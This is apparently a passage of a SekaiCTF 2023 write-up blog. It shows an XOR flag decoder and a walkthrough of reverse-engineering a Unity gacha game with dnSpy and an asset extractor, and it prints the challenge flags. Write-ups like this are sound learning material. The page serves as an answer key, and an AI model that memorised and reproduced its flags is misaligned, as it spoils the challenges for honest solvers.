<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">FLAG = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;20762001782445454615001000284b41193243004e41000b2d0542052c0b1932432d0441000b2d05422852124a1f096b4e000f&#x27;</span>)</span><br><span class="line">KEY = <span class="string">&#x27;s3k@1_v3ry_w0w&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Asc</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(char)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XOREncrypt</span>(<span class="params">key, data_in</span>):</span><br><span class="line">    data_out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ptr <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_in)):</span><br><span class="line">        val1 = data_in[ptr]</span><br><span class="line">        val2 = Asc(key[ptr % key_length])</span><br><span class="line"></span><br><span class="line">        val3 = val1 ^ val2</span><br><span class="line"></span><br><span class="line">        data_out += <span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(val3)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(data_out), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XOREncrypt(KEY, FLAG)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Flag: <code>SEKAI&#123;3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483&#125;</code></p>
<h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Azusawa’s-Gacha-World"><a href="#Azusawa’s-Gacha-World" class="headerlink" title="Azusawa’s Gacha World"></a>Azusawa’s Gacha World</h3><p>Score: 100<br>Solves: 303&#x2F;2013<br>Attachments: <a href="azusawas-gacha-world-dist.zip">dist.zip</a></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://azusawa.world/#/2023/03/02">https://azusawa.world/#/2023/03/02</a></p>
</blockquote>
<p>Author: enscribe</p>
<p>The challenge provide us with a game, upon running it we can see that it’s a gacha game</p>
<p><img src="azusawas-gacha-world-game.png"></p>
<p>The game has 3 gacha rating from bowl, 3 stars, and 2 stars. The bowl is impossible to obtain though since it has 0% drop rate</p>
<p><img src="azusawas-gacha-world-game-rate.png"></p>
<p><img src="azusawas-gacha-world-game-drop.png"></p>
<p>Well, nothing much of interest though. Look like we’ve to reverse engineer it then</p>
<p>Since this is a unity game, by looking at the game splash screen or file structure, we can use dnSpy to decompile the code.</p>
<p>One file that often store the user compiled code is <code>Assembly-CSharp.dll</code>, which stored at <code>Asusawa&#39;s Gacha World_Data\Managed\Assembly-CSharp.dll</code></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> UnityWebRequest <span class="title">CreateGachaWebRequest</span>(<span class="params"><span class="built_in">string</span> json</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(json);</span><br><span class="line">	<span class="built_in">string</span> s = <span class="string">&quot;aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh&quot;</span>;</span><br><span class="line">	UnityWebRequest unityWebRequest = <span class="keyword">new</span> UnityWebRequest(Encoding.UTF8.GetString(Convert.FromBase64String(s)), <span class="string">&quot;POST&quot;</span>);</span><br><span class="line">	unityWebRequest.uploadHandler = <span class="keyword">new</span> UploadHandlerRaw(bytes);</span><br><span class="line">	unityWebRequest.downloadHandler = <span class="keyword">new</span> DownloadHandlerBuffer();</span><br><span class="line">	unityWebRequest.SetRequestHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">	unityWebRequest.SetRequestHeader(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;SekaiCTF&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> unityWebRequest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Analyzing the <code>CreateGachaWebRequest</code> method inside <code>GachaManager</code> class, we could see that every time that we pull a gacha base64 decode <code>aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh</code> which is <a target="_blank" rel="noopener" href="http://172.86.64.89:3000/gacha">http://172.86.64.89:3000/gacha</a></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> IEnumerator <span class="title">DisplayFourStarCharacter</span>(<span class="params">Character character</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>.ResetAnimations();</span><br><span class="line">	<span class="keyword">this</span>.cardNameText.text = character.cardName;</span><br><span class="line">	<span class="keyword">this</span>.UpdateSplashArtImage(character.splashArt, <span class="keyword">this</span>.threeStarSplash);</span><br><span class="line">	<span class="keyword">this</span>.threeStarSplash.gameObject.SetActive(<span class="literal">true</span>);</span><br><span class="line">	Animation threeStarSplashAnimation = <span class="keyword">this</span>.threeStarSplash.GetComponent&lt;Animation&gt;();</span><br><span class="line">	Animation starsAnimation = <span class="keyword">this</span>.stars.GetComponent&lt;Animation&gt;();</span><br><span class="line">	Animation namecardMaskAnimation = <span class="keyword">this</span>.namecardMask.GetComponent&lt;Animation&gt;();</span><br><span class="line">	<span class="built_in">string</span> flag = character.flag;</span><br><span class="line">	<span class="keyword">if</span> (flag != <span class="literal">null</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">byte</span>[] data = Convert.FromBase64String(flag);</span><br><span class="line">		Texture2D texture2D = <span class="keyword">new</span> Texture2D(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">		texture2D.LoadImage(data);</span><br><span class="line">		Rect rect = <span class="keyword">new</span> Rect(<span class="number">0f</span>, <span class="number">0f</span>, (<span class="built_in">float</span>)texture2D.width, (<span class="built_in">float</span>)texture2D.height);</span><br><span class="line">		Vector2 pivot = <span class="keyword">new</span> Vector2(<span class="number">0.5f</span>, <span class="number">0.5f</span>);</span><br><span class="line">		Sprite sprite = Sprite.Create(texture2D, rect, pivot);</span><br><span class="line">		<span class="keyword">this</span>.flagImage.sprite = sprite;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">this</span>.isAnimating = <span class="literal">true</span>;</span><br><span class="line">	threeStarSplashAnimation.Play();</span><br><span class="line">	<span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitForSeconds</span>(<span class="params"><span class="number">1f</span></span>)</span>;</span><br><span class="line">	AudioController.Instance.PlaySFX(<span class="string">&quot;FourStar&quot;</span>);</span><br><span class="line">	starsAnimation.Play(<span class="string">&quot;FourStarRarity&quot;</span>);</span><br><span class="line">	<span class="keyword">this</span>.flagImage.gameObject.SetActive(<span class="literal">true</span>);</span><br><span class="line">	namecardMaskAnimation.Play();</span><br><span class="line">	<span class="function"><span class="keyword">yield</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="title">WaitUntil</span>(<span class="params">(</span>)</span> =&gt; !threeStarSplashAnimation.isPlaying);</span><br><span class="line">	<span class="keyword">this</span>.isAnimating = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">yield</span> <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Analyzing the <code>DisplayFourStarCharacter</code> method inside <code>UIManager</code> class, we could see that once we able to pull bowl or 4 star character, it will show us the flag.</p>
<p>Now that we know there’s a flag inside the game file, specifically inside asset files, we could use Unity Asset Bundle Extractor to extract game assets and get the flag file.</p>
<p><img src="azusawas-gacha-world-game-asset-extract.png"></p>
<p>With Unity Asset Bundle Extractor I loaded the <code>resources.assets</code> file and found and an asset name <code>flag</code>, and exported it with the plugins provided within the program</p>
<p><img src="azusawas-gacha-world-flag.png"></p>
<p>Flag: <code>SEKAI&#123;D0N7_73LL_53G4_1_C0P13D_7H31R_G4M3&#125;</code></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="../../../../index.html">Home</a></li>
        
          <li><a href="../../../../about/">About</a></li>
        
          <li><a href="../../../../archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/nkd3v">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DEF-CON-Invitation"><span class="toc-number">1.1.</span> <span class="toc-text">DEF CON Invitation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reconnaissance"><span class="toc-number">1.1.1.</span> <span class="toc-text">Reconnaissance</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Analysis"><span class="toc-number">1.1.3.</span> <span class="toc-text">Dynamic Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Retrieve-the-key"><span class="toc-number">1.1.4.</span> <span class="toc-text">Retrieve the key</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Eval-Me"><span class="toc-number">1.2.</span> <span class="toc-text">Eval Me</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">2.</span> <span class="toc-text">Reverse Engineering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Azusawa%E2%80%99s-Gacha-World"><span class="toc-number">2.1.</span> <span class="toc-text">Azusawa’s Gacha World</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&text=SekaiCTF 2023 Writeups"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&is_video=false&description=SekaiCTF 2023 Writeups"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SekaiCTF 2023 Writeups&body=Check out this article: https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&title=SekaiCTF 2023 Writeups"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&name=SekaiCTF 2023 Writeups&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://nkd3v.github.io/2023/08/31/SekaiCTF-2023-Writeups/&t=SekaiCTF 2023 Writeups"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    Narongpol Kijrangsan
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../about/">About</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/nkd3v">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
